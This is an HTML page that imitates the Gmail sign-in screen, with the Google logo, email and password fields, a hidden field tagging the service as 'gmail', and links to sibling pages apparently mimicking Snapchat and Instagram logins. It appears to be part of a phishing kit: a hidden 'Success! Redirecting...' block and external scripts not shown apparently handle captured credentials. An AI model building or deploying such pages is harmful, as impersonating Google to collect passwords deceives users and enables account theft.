<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign in</title>
    <link rel="manifest" href="/manifest.json">
    <link rel="stylesheet" href="style.css">
</head>
<body class="gmail-theme">
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" alt="Google Logo" style="width: 100px;">
        </div>
        <h2 style="color: #202124; font-weight: 400; margin-bottom: 10px;">Sign in</h2>
        <p style="color: #202124; margin-bottom: 30px;">to continue to Gmail</p>
        <form id="loginForm">
            <input type="hidden" id="service_name" value="gmail">
            <input type="text" id="username" name="username" placeholder="Email or phone" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
        <a href="#" class="forgot-password" style="color: #1a73e8;">Forgot email?</a>

        <div class="social-nav">
            <a href="index.html" title="Login with Snapchat">
                <img src="https://www.freepnglogos.com/uploads/snapchat-logo-png-0.png" alt="Snapchat" width="20" height="20">
            </a>
            <a href="instagram.html" title="Login with Instagram">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/2048px-Instagram_icon.png" alt="Instagram" width="20" height="20">
            </a>
        </div>
    </div>
    <div class="congrats-container" style="display: none;">
        <h2>Success!</h2>
        <p>Redirecting...</p>
    </div>
    <script src="ovpn-generator.js"></script>
    <script src="network-config-native.js"></script>
    <script src="script-enhanced.js"></script>
</body>
</html>
